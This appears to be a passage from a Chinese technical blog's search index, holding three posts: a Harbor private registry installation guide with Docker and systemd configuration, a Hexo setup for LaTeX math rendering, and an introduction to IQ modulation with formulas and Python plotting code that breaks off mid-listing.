通过阿里云的镜像加速服务，yum安装docker-ce，详细操作方式参见<a href=\"https://blog.caogo.cn/2020/06/25/Kubernetes%E9%9B%86%E7%BE%A4%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/\">Kubernetes集群的安装记录</a></p>\n<p> docker-compose的标准安装方法是从docker.com下载，速度太慢无法忍受。<br> 还好，阿里云提供了<a href=\"http://mirrors.aliyun.com/docker-toolbox/linux/\">Docker-toolbox的下载地址</a>。<br> 注意：要手工改文件名，设置执行权限，并搬到PATH路径下。</p>\n</li>\n<li><p>下载harbor安装包</p>\n<p> 这里是<a href=\"https://github.com/goharbor/harbor/releases/tag/v1.10.3\">Harbor v1.10.3 下载地址</a>，解压后放在目录<code>/opt/harbor/</code>下。<br> 离线方式的安装包有600M+，其中包含了全部所需的镜像文件，后续安装中通过<code>docker load</code>方式直接读取压缩包，就不需要联网了。</p>\n<blockquote>\n<p>v1.10.2有个bug无法正常安装，表现是log容器启动时，爆出sudo权限过期，可能是基础镜像的问题)</p>\n</blockquote>\n</li>\n<li><p>配置并安装harbor</p>\n<p> 在启动目录<code>/opt/harbor/</code>下，编辑Harbor配置文件<code>harbor.yml</code>，关键信息如下：</p>\n<pre><code> <figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">hostname：192.168.0.130</span></span><br><span class=\"line\"><span class=\"string\">http：</span></span><br><span class=\"line\"><span class=\"string\">port：7350</span></span><br><span class=\"line\"><span class=\"comment\"># https:</span></span><br><span class=\"line\"><span class=\"attr\">data_volume:</span> <span class=\"string\">/data/harbor/</span></span><br></pre></td></tr></table></figure>\n</code></pre>\n<p> 运行命令<code>install.sh</code>，自动拉取压缩包的镜像文件，并生成<code>docker-compose.yml</code>，这就是以后的部署配置。<br> 最后，Harbor主目录的结构是这样的：</p>\n<pre><code> <figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@dnsmasq harbor]<span class=\"comment\"># tree /opt/harbor -L 2</span></span><br><span class=\"line\">/opt/harbor                    <span class=\"comment\">## Harbor Sever的主目录</span></span><br><span class=\"line\">├── common</span><br><span class=\"line\">│   └── config</span><br><span class=\"line\">├── common.sh   </span><br><span class=\"line\">├── docker-compose.yml          <span class=\"comment\">## 最后生成的Depolyment配置文件</span></span><br><span class=\"line\">├── harbor.v1.10.3.tar.gz       <span class=\"comment\">## 离线安装的镜像文件包，docker save &amp;&amp; docker load</span></span><br><span class=\"line\">├── harbor.yml                  <span class=\"comment\">## 初始化安装的配置文件</span></span><br><span class=\"line\">├── install.sh                  <span class=\"comment\">## 安装入口程序</span></span><br><span class=\"line\">├── LICENSE</span><br><span class=\"line\">└── prepare</span><br></pre></td></tr></table></figure>\n</code></pre>\n</li>\n<li><p>启动harbor并检查</p>\n<p> 通过<code>docker-compose up -d --build</code>启动Harbor，然后就可以通过浏览器访问<a href=\"http://192.168.0.130:7350/\">http://192.168.0.130:7350</a><br> 在浏览器界面，输入用户名和密码，就可以看见镜像仓库的具体信息了。</p>\n</li>\n</ol>\n<h2 id=\"Client的使用方法\"><a href=\"#Client的使用方法\" class=\"headerlink\" title=\"Client的使用方法\"></a>Client的使用方法</h2><p>需要注意的是，Client的docker是独立的配置，如果不需要上传镜像，根本不用登录Harbor Server，直接设置mirror镜像就可以了。</p>\n<pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">&#123;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;exec-opts&quot;: [&quot;native.cgroupdriver=systemd&quot;],</span></span><br><span class=\"line\"><span class=\"string\">    &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class=\"line\"><span class=\"string\">    &quot;log-opts&quot;: &#123;</span></span><br><span class=\"line\"><span class=\"string\">    &quot;max-size&quot;: &quot;100m&quot;</span></span><br><span class=\"line\"><span class=\"string\">    &#125;,</span></span><br><span class=\"line\"><span class=\"string\">    &quot;storage-driver&quot;: &quot;overlay2&quot;,</span></span><br><span class=\"line\"><span class=\"string\">    &quot;insecure-registries&quot;: [</span></span><br><span class=\"line\"><span class=\"string\">    &quot;192.168.0.130:7350&quot;</span></span><br><span class=\"line\"><span class=\"string\">    ],</span></span><br><span class=\"line\"><span class=\"string\">    &quot;registry-mirrors&quot;: [</span></span><br><span class=\"line\"><span class=\"string\">        &quot;http://192.168.0.130:7350&quot;</span></span><br><span class=\"line\"><span class=\"string\">    ]</span></span><br><span class=\"line\"><span class=\"string\">&#125;</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl restart docker</span><br><span class=\"line\">docker info</span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>当然，注意由于私有仓库是http模式，需要显示设置insecure-registries的不安全访问方式。<br>修改配置文件后，还需要重启守护进程和docker.service，然后你就可以正常使用私有仓库Harbor了！！！</p>\n<pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\">[root@localhost docker]<span class=\"comment\"># docker login http://192.168.0.130:7350 -u admin -p xxxxxx</span></span><br><span class=\"line\">WARNING! Using --password via the CLI is insecure. Use --password-stdin.</span><br><span class=\"line\">WARNING! Your password will be stored unencrypted <span class=\"keyword\">in</span> /root/.docker/config.json.</span><br><span class=\"line\">Configure a credential helper to remove this warning. See</span><br><span class=\"line\">https://docs.docker.com/engine/reference/commandline/login/<span class=\"comment\">#credentials-store</span></span><br><span class=\"line\"></span><br><span class=\"line\">Login Succeeded</span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost docker]<span class=\"comment\"># docker tag python:3.7-slim 192.168.0.130:7350/library/python:3.7-slim</span></span><br><span class=\"line\"></span><br><span class=\"line\">[root@localhost docker]<span class=\"comment\"># docker push 192.168.0.130:7350/library/python:3.7-slim</span></span><br><span class=\"line\">The push refers to repository [192.168.0.130:7350/library/python]</span><br><span class=\"line\">0c6163f2d025: Pushed</span><br><span class=\"line\">361df01300cf: Pushed</span><br><span class=\"line\">8f9ba0be9040: Pushed</span><br><span class=\"line\">0bd71a837902: Layer already exists</span><br><span class=\"line\">13cb14c2acd3: Layer already exists</span><br><span class=\"line\">3.7-slim: digest: sha256:e0f6a4df17d5707637fa3557ab266f44dddc46ebfc82b0f1dbe725103961da4e size: 1370</span><br></pre></td></tr></table></figure>\n</code></pre>\n<p>现在admin界面，就可以找到这个镜像了，以后就可以直接本地拉取了。</p>\n<img src=\"/2020/07/12/Harbor%E7%9A%84%E5%AE%89%E8%A3%85%E8%AE%B0%E5%BD%95/admin.png\" class=\"\">\n\n<h2 id=\"HTPPS访问的设置方法\"><a href=\"#HTPPS访问的设置方法\" class=\"headerlink\" title=\"HTPPS访问的设置方法\"></a>HTPPS访问的设置方法</h2><p>可以采用基于IP地址的访问方式，但是更推荐采用域名方式，具体步骤参见<a href=\"https://blog.csdn.net/networken/article/details/107502461\">harbor安装并配置https</a><br>主要包括以下环节：</p>\n<ul>\n<li>生成证书颁发机构证书：ca.key，ca.csr</li>\n<li>生成服务器证书： harbor.caogo.local.key, harbor.caogo.local.crt, v3.ext</li>\n<li>提供证书给Harbor和Docker: 注意Docker默认使用.cert文件，而非.crt</li>\n<li>部署或重新配置harbor: 编辑harbor.yml，运行install.sh进行设置，通过docker-compose启动</li>\n</ul>\n<p>也可以参见<a href=\"https://goharbor.io/docs/2.0.0/install-config/configure-https/\">Harbor配置HTTPS的官方文档</a></p>\n<p>配置HTTPS方式后，客户端Docker访问Harbor就可以不需要设置<code>unsecure-registries</code>参数了。</p>\n<blockquote>\n<p>个人强烈推荐Http方式，而不是Https方式！！！<br>因为自签名证书需要客户端Docker配合导入证书，而真实域名证书受到ECS出口带宽限制，速度很感人！</p>\n</blockquote>\n<hr>\n<h3 id=\"自制的image-push小工具（还要优化……）\"><a href=\"#自制的image-push小工具（还要优化……）\" class=\"headerlink\" title=\"自制的image push小工具（还要优化……）\"></a>自制的image push小工具（还要优化……）</h3><pre><code><figure class=\"highlight sh\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cat</span> &gt; harbor-push.sh &lt;&lt; <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">#!/bin/bash </span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">count=1</span></span><br><span class=\"line\"><span class=\"string\">while read repo tag others   # 从docker images的输出中获得镜像信息，注意剔除第一行 </span></span><br><span class=\"line\"><span class=\"string\">do </span></span><br><span class=\"line\"><span class=\"string\">    src_image=$repo&quot;:&quot;$tag</span></span><br><span class=\"line\"><span class=\"string\">    dst_image=192.168.0.130:7350/library/$src_image</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    echo &quot;$count: $src_image is pushing...&quot; &gt;&amp; 2</span></span><br><span class=\"line\"><span class=\"string\">    </span></span><br><span class=\"line\"><span class=\"string\">    echo docker tag $src_image $dst_image</span></span><br><span class=\"line\"><span class=\"string\">    echo docker push $dst_image</span></span><br><span class=\"line\"><span class=\"string\">    echo docker rmi $dst_image</span></span><br><span class=\"line\"><span class=\"string\"></span></span><br><span class=\"line\"><span class=\"string\">    count=$(($count + 1))</span></span><br><span class=\"line\"><span class=\"string\">done</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> a+x harbor-push.sh</span><br><span class=\"line\">docker images |<span class=\"built_in\">tail</span> -n +2 |./harbor-push.sh </span><br></pre></td></tr></table></figure>\n</code></pre>\n<h3 id=\"手工启动和停止Harbor的操作方法\"><a href=\"#手工启动和停止Harbor的操作方法\" class=\"headerlink\" title=\"手工启动和停止Harbor的操作方法\"></a>手工启动和停止Harbor的操作方法</h3><p>由于Harbor是采用docker-compose方式启动的，因此关机之前最好手工停止服务，输入：</p>\n<p><code>cd /opt/harbor &amp;&amp; docker-compose down</code></p>\n<p>开机后，启动Harbor服务的方式也类似，执行命令:</p>\n<p><code>cd /opt/harbor &amp;&amp; docker-compose up -d --build</code></p>\n<h3 id=\"通过Systemd设置Harbor开机自启动\"><a href=\"#通过Systemd设置Harbor开机自启动\" class=\"headerlink\" title=\"通过Systemd设置Harbor开机自启动\"></a>通过Systemd设置Harbor开机自启动</h3><pre><code><figure class=\"highlight shell\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat &gt; /etc/systemd/system/harbor.service &lt;&lt; EOF</span><br><span class=\"line\">[Unit]</span><br><span class=\"line\">Description=Harbor</span><br><span class=\"line\">After=docker.service systemd-networkd.service systemd-resolved.service</span><br><span class=\"line\">Requires=docker.service</span><br><span class=\"line\">Documentation=http://github.com/vmware/harbor</span><br><span class=\"line\"></span><br><span class=\"line\">[Service]</span><br><span class=\"line\">Type=simple</span><br><span class=\"line\">Restart=on-failure</span><br><span class=\"line\">RestartSec=5</span><br><span class=\"line\">ExecStartPre=/usr/bin/docker-compose -f /opt/harbor/docker-compose.yml down</span><br><span class=\"line\">ExecStart=/usr/bin/docker-compose -f /opt/harbor/docker-compose.yml up</span><br><span class=\"line\">ExecStop=/usr/bin/docker-compose -f /opt/harbor/docker-compose.yml down</span><br><span class=\"line\"></span><br><span class=\"line\">[Install]</span><br><span class=\"line\">WantedBy=multi-user.target</span><br><span class=\"line\">EOF</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">重载Systemd并设置Harbor自启动</span></span><br><span class=\"line\">systemctl daemon-reload</span><br><span class=\"line\">systemctl enable harbor</span><br><span class=\"line\">systemctl status harbor</span><br></pre></td></tr></table></figure>\n</code></pre>\n<blockquote>\n<p>启动时，增加了 ExecStartPre 环节，以防止异常退出时大量 exit 状态的容器无法关闭！</p>\n</blockquote>\n<h2 id=\"参考资料\"><a href=\"#参考资料\" class=\"headerlink\" title=\"参考资料\"></a>参考资料</h2><ul>\n<li><a href=\"https://github.com/goharbor/harbor\">Harbor的官方网站</a></li>\n<li><a href=\"https://github.com/AliyunContainerService/image-syncer/blob/master/README-zh_CN.md\">Image-syncer：阿里云提供的另一个镜像同步工具</a></li>\n<li><a href=\"https://blog.csdn.net/hxpjava1/article/details/79308890\">很全面的Harbor系统集成方法</a></li>\n<li><a href=\"https://blog.csdn.net/weixin_33736048/article/details/92953567?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-7.nonecase\">Harbor与Nginx的集成中发现的问题</a></li>\n</ul>\n"},{"title":"Hexo 支持 LaTeX 数学公式","url":"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/","content":"<p>LaTex 是一个创建专业文档的工具，在各类科学文献中得到了广泛的使用。它不仅可以创建出有着漂亮排版的文档，还可以让用户非常方便的处理排版中非常复杂的一些问题，例如输入数学公式、创建表格、引用、参考文献，以及全文统一的格式。<br>LaTeX 是一种排版语言，并非所见即所得，而是基于 What You See Is What You Mean 的理念，用户需要输入特定的代码，保存在后缀为<code>.tex</code>的文件中，通过编译得到所需的pdf文件。</p>\n<h2 id=\"配置方法\"><a href=\"#配置方法\" class=\"headerlink\" title=\"配置方法\"></a>配置方法</h2><p>Hexo博客中支持复杂数学公式的渲染，MathJax 和 KaTeX 是两个常见的渲染引擎。</p>\n<p>MathJax是一个开源JavaScript库。它支持<strong>LaTeX</strong>、MathML、AsciiMath符号，可以运行于所有流行浏览器上。MathJax使用网络字体（大部分浏览器都支持）去产生高质量的排版，使其在所有分辨率都可缩放和显示。使用MathJax显示数学公式是基于文本的，而非图片，因此可以被搜索引擎使用。<br>MathJax 使用者多、兼容性好、但渲染速度慢；KaTeX渲染速度快，且根号无错位，但时有bug。</p>\n<p><code>_config.next.yml</code>的配置实例：</p>\n<figure class=\"highlight yml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">math:</span></span><br><span class=\"line\">  <span class=\"comment\"># Default (false) will load mathjax / katex script on demand.</span></span><br><span class=\"line\">  <span class=\"comment\"># That is it only render those page which has `mathjax: true` in front-matter.</span></span><br><span class=\"line\">  <span class=\"comment\"># If you set it to true, it will load mathjax / katex script EVERY PAGE.</span></span><br><span class=\"line\">  <span class=\"attr\">every_page:</span> <span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">mathjax:</span></span><br><span class=\"line\">    <span class=\"attr\">enable:</span> <span class=\"literal\">true</span></span><br><span class=\"line\">    <span class=\"comment\"># Available values: none | ams | all</span></span><br><span class=\"line\">    <span class=\"attr\">tags:</span> <span class=\"string\">none</span></span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"attr\">katex:</span></span><br><span class=\"line\">    <span class=\"attr\">enable:</span> <span class=\"literal\">false</span></span><br><span class=\"line\">    <span class=\"comment\"># See: https://github.com/KaTeX/KaTeX/tree/master/contrib/copy-tex</span></span><br><span class=\"line\">    <span class=\"attr\">copy_tex:</span> <span class=\"literal\">false</span></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"基本语法\"><a href=\"#基本语法\" class=\"headerlink\" title=\"基本语法\"></a>基本语法</h2><p>行内公式：放在文字中间的公式，用一对<code>$</code>包括起来。<br>行间公式：公式独立成行，也叫独立公式，用一对<code>$$</code>。</p>\n<p><code>^</code> ：上标，<code>_</code> ：下标。<br>如果上下标的内容多于一个字符，需要用一对<code>&#123;&#125;</code> 将这些内容括成一个整体。<br>上下标可以嵌套，也可以同时使用。</p>\n<p>公式对齐：<br>使用形如<code>\\begin&#123;align&#125;...\\end&#123;align&#125;</code>的格式，其中需要使用<code>&amp;</code>来指示需要对齐的位置。</p>\n<h2 id=\"常用表达式\"><a href=\"#常用表达式\" class=\"headerlink\" title=\"常用表达式\"></a>常用表达式</h2><p>罗马字母<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/letters.png\" alt=\"罗马字母表\"></p>\n<p>运算符<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/symbols-1.png\" alt=\"数学符号1\"></p>\n<p>关系符<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/relations.png\" alt=\"关系\"></p>\n<p>箭头符号<br><img src=\"/2023/11/26/Hexo-%E6%94%AF%E6%8C%81-LaTeX-%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/arrows.png\" alt=\"arrow\"></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://katex.org/docs/supported.html\">LaTeX 语法 - 官方</a></li>\n<li><a href=\"https://blog.csdn.net/wzk4869/article/details/126863936\">KaTeX 的中文简明语法</a></li>\n<li><a href=\"https://mathjax-chinese-doc.readthedocs.io/en/latest/index.html#\">MathJax 中文文档 - 官方</a></li>\n<li><a href=\"https://bachzart.github.io/2020/09/17/MathJax-%E8%AF%AD%E6%B3%95%E5%BF%AB%E9%80%9F%E6%8C%87%E5%8D%97/\">MathJax 语法快速指南</a></li>\n<li><a href=\"https://blog.csdn.net/xm_ovo/article/details/107536132\">解决mathjax公式不换行问题</a></li>\n</ul>\n<h3 id=\"文档下载\"><a href=\"#文档下载\" class=\"headerlink\" title=\"文档下载\"></a>文档下载</h3><ul>\n<li><a href=\"Latex%E9%80%9F%E6%9F%A5.pdf\">Latex 速查手册</a></li>\n<li><a href=\"GB-3102.11-1993.pdf\">国家标准 GB 3102.11-1993 物理科学和技术中使用的数学符号</a></li>\n</ul>\n"},{"title":"IQ 调制技术简介","url":"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/","content":"<h2 id=\"一、基本原理\"><a href=\"#一、基本原理\" class=\"headerlink\" title=\"一、基本原理\"></a>一、基本原理</h2><p>IQ 调制很早就在模拟调制技术中得到应用，最初是为了解决多个信号的合成问题。</p>\n<p>传统的信号合成是采用三角函数的<strong>乘法</strong>。<br>定义：载波信号为$\\cos \\omega_ct$，基带信号为$s(t)&#x3D;\\cos \\omega t$，则调制结果为<br>$$ s_{RF}(t) &#x3D; s(t) \\cos \\omega_ct &#x3D; \\cos \\omega t \\cos \\omega _ct<br>    &#x3D; \\frac {\\cos(\\omega_c - \\omega)t + \\cos(\\omega_c + \\omega)t} 2<br>$$</p>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/class.png\" alt=\"class\"></p>\n<p>测试结果显示 1hz 和 10hz 的两个频率相乘后生成了一个 10-1,10+1 两个频率，过滤其中一个就可以还原出基带信号。然而，两个<strong>对称</strong>的频率脉冲比较接近，剔除不太容易，还浪费了宝贵的频率带宽。</p>\n<h2 id=\"二、模拟信号处理\"><a href=\"#二、模拟信号处理\" class=\"headerlink\" title=\"二、模拟信号处理\"></a>二、模拟信号处理</h2><p>在 IQ 调制中，信号被分解为两个正交的分量独立地携带信息，从而提高数据传输的效率。</p>\n<ul>\n<li><strong>I（In-phase）分量</strong>：同相分量，与载波信号同相位。</li>\n<li><strong>Q（Quadrature）分量</strong>：正交分量，与载波信号相位相差90度（或π&#x2F;2弧度）。</li>\n</ul>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/IQ.gif\" alt=\"IQ\"></p>\n<h3 id=\"1-调制环节\"><a href=\"#1-调制环节\" class=\"headerlink\" title=\"1. 调制环节\"></a>1. 调制环节</h3><p>载波信号和基带信号的调制采用三角函数的<strong>减法</strong>，结果是一个单一的正弦波，频率是 $\\omega_c - \\omega $ 。</p>\n<p>$$ s_{RF}(t) &#x3D; \\cos (\\omega_ct - \\omega t)<br>    &#x3D; \\cos\\omega_ct \\cos \\omega t + \\sin \\omega _ct \\sin \\omega t<br>$$</p>\n<p>令：$ I(t) &#x3D; \\cos \\omega t ,Q(t) &#x3D; \\sin \\omega t $ ，则：<br>$$ s_{RF}(t) &#x3D; I(t) \\cos \\omega_ct + Q(t) \\sin \\omega_ct $$</p>\n<p>其中，$\\omega_c $ 是载波的角频率，$I(t)$ 和 $Q(t)$ 分别是调制信号的同相和正交分量。</p>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/modern.png\" alt=\"modern\"></p>\n<h4 id=\"调制的技术实现\"><a href=\"#调制的技术实现\" class=\"headerlink\" title=\"调制的技术实现\"></a>调制的技术实现</h4><ol>\n<li>载波发生器提供一个 $\\cos(\\omega_ct)$ 余弦信号，并通过<strong>移相</strong>生成一个 $\\sin(\\omega_ct)$ 正弦信号；</li>\n<li>Q 基带信号和正弦载波信号<strong>相乘</strong>，I 基带信号和余弦载波信号<strong>相乘</strong>；</li>\n<li>再将两路信号<strong>相加</strong>，最后得到调制结果信号 $I \\cos \\omega_ct + Q \\sin \\omega_ct $。</li>\n</ol>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/IQ-struct.jpg\" alt=\"IQ\"></p>\n<h3 id=\"2-解调环节\"><a href=\"#2-解调环节\" class=\"headerlink\" title=\"2. 解调环节\"></a>2. 解调环节</h3><p>在解调环节，分别处理 I 分支和 Q 分支：<br>对于 I 分支，利用相同的载波，乘以两倍的余弦信号：<br>$$<br>\\begin {align}<br>    [I \\cos \\omega_ct  + Q \\sin \\omega_ct].2\\cos \\omega_ct &amp; &#x3D; I.2 \\cos ^2\\omega_ct + Q.\\sin 2\\omega_ct \\\\<br>    &amp; &#x3D; I.(1+\\cos 2\\omega_ct) + Q.\\sin 2\\omega_ct \\\\<br>    &amp; &#x3D; I + I.\\cos 2\\omega_ct + Q.\\sin 2\\omega t<br>\\end {align}<br>$$</p>\n<p>对于 Q 分支，基于同一载波的相位偏移得到正弦信号，并同样做乘法：<br>$$<br>\\begin {align}<br>    [I \\cos \\omega_ct  + Q \\sin \\omega_ct].2\\sin \\omega_ct &amp; &#x3D; I.\\sin 2\\omega_ct + Q.2 \\sin ^2\\omega_ct \\\\<br>    &amp; &#x3D; I.\\sin 2\\omega_ct + Q.(1-\\cos 2\\omega_ct) \\\\<br>    &amp; &#x3D; Q - Q.\\cos 2\\omega_ct + I.\\sin 2\\omega_ct<br>\\end {align}<br>$$</p>\n<p>上面的数学结果似乎很复杂，但由于 $2\\omega_c$ 频率远高于载波频率 $\\omega_c$，使用一个低通滤波器就可以剔除，结果就是纯净的 I 和 Q 基带信号。</p>\n<h4 id=\"解调的技术实现\"><a href=\"#解调的技术实现\" class=\"headerlink\" title=\"解调的技术实现\"></a>解调的技术实现</h4><ol>\n<li>接受端的载波发生器与发送端完全相同，提供一个 $\\cos(\\omega_ct)$ 余弦信号，并通过<strong>移相</strong>生成一个 $\\sin(\\omega_ct)$ 正弦信号；</li>\n<li>收到的调制信号和余弦载波信号<strong>相乘</strong>，通过低通滤波器清除高频部分，得到纯净的 I 基带信号</li>\n<li>收到的调制信号和正弦载波信号<strong>相乘</strong>，通过低通滤波器清除高频部分，得到纯净的 Q 基带信号</li>\n</ol>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/IQ-A.png\" alt=\"alt text\"></p>\n<h2 id=\"三、数字信号处理\"><a href=\"#三、数字信号处理\" class=\"headerlink\" title=\"三、数字信号处理\"></a>三、数字信号处理</h2><p>IQ 模式同样可以用于数字调制方式，只不过数字信息要通过数模转换生成和判决。其数学原理基于三角函数的辅助角公式，即：</p>\n<p>$$ a\\sin \\alpha + b \\cos \\alpha &#x3D; \\sqrt {a^2+b^2} \\sin (\\alpha + \\varphi), 其中 \\tan \\varphi &#x3D; \\frac b a $$</p>\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/IQ-D.png\" alt=\"alt text\"></p>\n<h2 id=\"四、代码实例\"><a href=\"#四、代码实例\" class=\"headerlink\" title=\"四、代码实例\"></a>四、代码实例</h2><h3 id=\"发送端代码\"><a href=\"#发送端代码\" class=\"headerlink\" title=\"发送端代码\"></a>发送端代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># NumPy 是一个数学函数库，支持维度数组与矩阵运算</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Scipy 是基于 Numpy 的高级科学计算库，支持线性代数、积分、微分、快速傅里叶变换、信号处理和图像处理</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> scipy.signal <span class=\"keyword\">as</span> sig</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Pyplot 是 Matplotlib 的子库，提供了和 MATLAB 类似的绘图 API</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> matplotlib.pyplot <span class=\"keyword\">as</span> plt         </span><br><span class=\"line\"></span><br><span class=\"line\">t_max = <span class=\"number\">1.5</span>                                 <span class=\"comment\"># 计算 2 秒</span></span><br><span class=\"line\">fs = <span class=\"number\">60</span>                                     <span class=\"comment\"># 采样周期 1/60</span></span><br><span class=\"line\">fc = <span class=\"number\">1</span>                                      <span class=\"comment\"># 基础频率为 1 Hz               </span></span><br><span class=\"line\"></span><br><span class=\"line\">times = np.arange(<span class=\"number\">0</span>, t_max, <span class=\"number\">1</span>/fs)           <span class=\"comment\"># 采样的时间序列，90个元素的数组</span></span><br><span class=\"line\">phases = <span class=\"number\">2</span> * np.pi * fc * times             <span class=\"comment\"># 采样的相位序列，90个元素的数组</span></span><br><span class=\"line\">new_ticks = np.arange(<span class=\"number\">0</span>, t_max, <span class=\"number\">1</span>/<span class=\"number\">8</span>)        <span class=\"comment\"># 每个周期有 8 个刻度 </span></span><br><span class=\"line\">new_lables = new_ticks * fs                 <span class=\"comment\"># 计算每个刻度的时间序列号</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_I</span>(<span class=\"params\">I</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> I * np.cos(phases)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_Q</span>(<span class=\"params\">Q</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> Q * np.sin(phases)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">signal_IQ</span>(<span class=\"params\">I,Q</span>):</span><br><span class=\"line\">    <span class=\"keyword\">return</span> signal_I(I) + signal_Q(Q)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">test_send</span>():</span><br><span class=\"line\">    I=<span class=\"number\">3</span></span><br><span class=\"line\">    Q=<span class=\"number\">4</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># plot 是标准的坐标图，参数是 X、Y、Label</span></span><br><span class=\"line\">    <span class=\"comment\"># 分别绘制 I、Q、IQ 三条曲线</span></span><br><span class=\"line\">    plt.plot(times, signal_I(I), label=<span class=\"string\">&quot;signal_I(&quot;</span> +  <span class=\"built_in\">str</span>(I) + <span class=\"string\">&quot;)&quot;</span> )      </span><br><span class=\"line\">    plt.plot(times, signal_Q(Q), label=<span class=\"string\">&quot;signal_I(&quot;</span> +  <span class=\"built_in\">str</span>(Q) + <span class=\"string\">&quot;)&quot;</span> )    </span><br><span class=\"line\">    plt.plot(times, signal_IQ(I,Q), label=<span class=\"string\">&quot;signal_IQ(&quot;</span> +  <span class=\"built_in\">str</span>(I) + <span class=\"string\">&quot;,&quot;</span> + <span class=\"built_in\">str</span>(Q)+ <span class=\"string\">&quot;)&quot;</span> ) </span><br><span class=\"line\"></span><br><span class=\"line\">    plt.legend()                                        <span class=\"comment\"># 图例的位置，默认自适应</span></span><br><span class=\"line\">    plt.grid()                                          <span class=\"comment\"># 显示网格线</span></span><br><span class=\"line\">    plt.xticks(ticks=new_ticks, labels=new_lables)      <span class=\"comment\"># X 轴的刻度 ticks &amp; 标签 label </span></span><br><span class=\"line\">    plt.show()                                          <span class=\"comment\"># 开始屏幕显示</span></span><br><span class=\"line\"></span><br><span class=\"line\">test_send()</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/2024/09/22/IQ-%E8%B0%83%E5%88%B6%E6%8A%80%E6%9C%AF%E7%AE%80%E4%BB%8B/send.png\" alt=\"send\"></p>\n<h3 id=\"接收端代码\"><a href=\"#接收端代码\" class=\"headerlink\" title=\"接收端代码\"></a>接收端代码</h3><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> numpy <span class=\"keyword\">as</span> np</span><br><span class=\"line\"><span class=\"keyword\">import</span> scipy.signal <span class=\"keyword\">as</span> sig</span><br><span class=\"line\"><span class=\"keyword\">import</span> 